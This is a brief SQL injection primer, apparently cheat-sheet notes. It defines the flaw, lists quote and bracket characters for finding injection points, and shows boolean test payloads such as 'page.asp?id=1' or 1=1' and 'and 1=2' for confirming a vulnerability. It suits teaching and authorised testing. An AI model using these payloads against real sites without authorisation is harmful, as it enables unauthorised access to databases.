### **What is SQL injection?**
```
An SQL injection is a security flaw that allows attackers to interfere with database queries of an application.
This vulnerability can enable attackers to view, modify, or delete data they shouldn’t access, including information of other users or any data the application can access.
Such actions may result in permanent changes to the application’s functionality or content or even compromision of the server or denial of service.
```

### **Entry point detection**
```
 [Nothing]
'
"
`
')
")
`)
'))
"))
`))
```

### **Confirming with logical operations**
- To confirm the presence of an SQL Injection vulnerability, we test logical operations within the query and observe any changes in the response.
If the website returns the same content when using statements like or 1=1, it indicates the vulnerability, and if the result changes when using and 1=2, it confirms it.

```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```




